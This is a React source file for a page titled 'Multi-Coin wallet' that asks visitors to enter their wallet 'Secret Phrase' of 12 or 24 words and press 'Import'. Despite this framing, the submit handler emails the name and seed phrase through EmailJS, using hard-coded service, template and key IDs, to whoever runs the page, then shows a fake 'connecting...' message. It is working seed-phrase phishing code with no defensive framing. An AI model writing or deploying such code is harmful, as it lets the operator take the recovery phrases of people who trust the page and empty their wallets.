import React, { useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import styled from 'styled-components'
import {BiArrowBack} from 'react-icons/bi'
import emailjs from '@emailjs/browser';

const FormCont = styled.div`
    width: 100%;
    height: 100vh;
    background: #efefef;
    h2{
      @media (max-width:480px) {
        font-size: 1rem;
      }
      width: 100%;
      background: #fff;
      font-weight: 500;
      height: 10vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .bck{
      @media (max-width:480px) {
        width: auto;
        margin-left: 2%;
      }
      position: absolute;
      top: 3.5%;
      font-size: 1.2rem;
      color: #000;
      width: 15%;
    }
    form{
      width: 90%;
      min-height: 80vh;
      margin: auto;
      input{
        @media (max-width:480px) {
          width: 100%;
          margin-top: 15%;
          margin-bottom: 5%;
        }
        display: block;
        width: 60%;
        height: 8vh;
        margin: auto;
        border: none;
        margin-top: 2%;
        margin-bottom: 2%;
        border-radius: 5px;
        padding-left: 2%;
        &:focus{
          outline: none;
        }
      }
      textarea{
        @media (max-width:480px) {
          width: 100%;
          margin-top: 5%;
          margin-bottom: 5%;
        }
        display: block;
        width: 60%;
        margin: auto;
        border: none;
        border-radius: 5px;
        padding-top: 2%;
        padding-left: 2%;
        &:focus{
          outline: none;
        }
      }
      p{
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: .8rem;
        color:#8b8585;
        margin-top: 1%;
      }
      button{
        @media (max-width:480px) {
          width: 100%;
          margin-top: 5%;
          margin-bottom: 5%;
          margin-left: 0%;
          font-size: 1rem;
        }
        width: 60%;
        margin-left: 20%;
        height: 8vh;
        margin-top: 2%;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        background: #5959e1;
        color: white;
        font-size: 1.5vw;
      }
    }
`
function Form() {
  const [name,setName] = useState('')
  const [message,SetMessage] = useState('')

  const formRef = useRef()
  const [done, isDone] = useState(false)

  const handleSubmit = (e) => {
    e.preventDefault()

    console.log(name,message)
    if(message.length < 12 ) {
      console.log('empty')
      alert('Fill in the correct details')
      return
    }
    emailjs.sendForm('service_0mhvxbd', 'template_2eedt5l', formRef.current, '8RJySH7rZZrTznIBh')
  .then((result) => {
      console.log(result.text);
      isDone(true)
  }, (error) => {
      console.log(error.text);
  });
}
  return (
    <FormCont>
        <Link to='/'><BiArrowBack className='bck'/></Link>
        <h2>Multi-Coin wallet</h2>
        <form action="" ref={formRef} onSubmit={handleSubmit}>
            <input value={name} onChange={(e)=>setName(e.target.value)} name='from_name' type="text"/>
            <textarea value={message} onChange={(e)=>SetMessage(e.target.value)} name="message" id="" cols="30" rows="15" placeholder="Secret Phrase">

            </textarea>
            <p>Typically 12 (sometimes 24) words separated by single spaces</p>

            <button>Import</button>
            {done && <p>connecting...</p>}
        </form>
    </FormCont>
  )
}

export default Form